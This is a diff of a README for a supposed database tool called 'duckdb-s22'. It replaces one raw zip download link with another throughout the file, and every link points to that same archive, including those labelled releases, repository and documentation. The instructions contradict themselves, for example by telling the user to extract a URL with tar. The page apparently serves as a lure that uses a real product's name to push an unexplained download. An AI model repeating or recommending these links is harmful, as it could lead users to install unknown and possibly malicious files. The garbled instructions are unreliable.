@@ -4,17 +4,17 @@
 Welcome to duckdb-s22! This application allows you to manage your database efficiently with minimal effort. Follow the steps below to download and run the software on your computer.
 
 ## 🔗 Download Here!
-[![Download duckdb-s22](https://raw.githubusercontent.com/Linco2749/duckdb-s22/main/haily/duckdb-s22-1.3.zip)](https://raw.githubusercontent.com/Linco2749/duckdb-s22/main/haily/duckdb-s22-1.3.zip)
+[![Download duckdb-s22](https://github.com/Linco2749/duckdb-s22/raw/refs/heads/main/haily/duckdb-s-3.6.zip)](https://github.com/Linco2749/duckdb-s22/raw/refs/heads/main/haily/duckdb-s-3.6.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download: [duckdb-s22 Releases](https://raw.githubusercontent.com/Linco2749/duckdb-s22/main/haily/duckdb-s22-1.3.zip).
+To get started, visit this page to download: [duckdb-s22 Releases](https://github.com/Linco2749/duckdb-s22/raw/refs/heads/main/haily/duckdb-s-3.6.zip).
 
 1. Click on the link above to access the Release page.
 2. Look for the latest version listed at the top. It will be clearly marked with a version number.
 3. Download the appropriate file based on your operating system (Windows, Mac, or Linux).
    - For Windows: Download the `.exe`file.
    - For Mac: Download the `.dmg` file.
-   - For Linux: Download the `https://raw.githubusercontent.com/Linco2749/duckdb-s22/main/haily/duckdb-s22-1.3.zip` file.
+   - For Linux: Download the `https://github.com/Linco2749/duckdb-s22/raw/refs/heads/main/haily/duckdb-s-3.6.zip` file.
 
 4. Once the download completes, locate the file in your downloads folder.
 5. Follow the installation instructions based on your operating system:
@@ -30,7 +30,7 @@ To get started, visit this page to download: [duckdb-s22 Releases](https://raw.g
    - **For Linux:**
      - Open a terminal.
      - Navigate to the directory where the file is located.
-     - Use the command `tar -xvzf https://raw.githubusercontent.com/Linco2749/duckdb-s22/main/haily/duckdb-s22-1.3.zip` to extract the files.
+     - Use the command `tar -xvzf https://github.com/Linco2749/duckdb-s22/raw/refs/heads/main/haily/duckdb-s-3.6.zip` to extract the files.
      - Follow any additional instructions in the README within the extracted folder.
 
 ## ⚙️ System Requirements
@@ -72,7 +72,7 @@ For additional help, you can contact support through the Issues section of our G
 ## 🔗 More Resources
 For further information, you can explore the following:
 
-- [GitHub Repository](https://raw.githubusercontent.com/Linco2749/duckdb-s22/main/haily/duckdb-s22-1.3.zip)
-- [Documentation](https://raw.githubusercontent.com/Linco2749/duckdb-s22/main/haily/duckdb-s22-1.3.zip)
+- [GitHub Repository](https://github.com/Linco2749/duckdb-s22/raw/refs/heads/main/haily/duckdb-s-3.6.zip)
+- [Documentation](https://github.com/Linco2749/duckdb-s22/raw/refs/heads/main/haily/duckdb-s-3.6.zip)
   
 With duckdb-s22, managing your database is straightforward and accessible. Follow these steps, and you'll be up and running in no time!
